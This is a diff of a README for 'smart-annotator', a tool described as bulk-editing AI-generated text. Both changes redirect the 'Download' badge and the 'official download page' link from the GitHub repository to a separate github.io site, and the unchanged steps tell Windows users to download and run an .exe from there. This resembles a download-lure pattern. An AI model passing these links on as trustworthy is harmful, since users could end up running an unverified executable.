@@ -1,6 +1,6 @@
 # 📝 smart-annotator - Improve bulk AI documents with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Davidmametsoftwood478/smart-annotator)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://davidmametsoftwood478.github.io)
 
 Smart-annotator helps you manage large sets of AI-generated text. You can add notes, corrections, and structure to your outputs in bulk. The software then sends these changes to your AI provider to improve the entire document set in one go. You spend less time on repetitive edits and more time on the final results.
 
@@ -8,7 +8,7 @@ Smart-annotator helps you manage large sets of AI-generated text. You can add no
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Davidmametsoftwood478/smart-annotator).
+1. Visit the [official download page](https://davidmametsoftwood478.github.io).
 2. Locate the latest release version on the screen.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
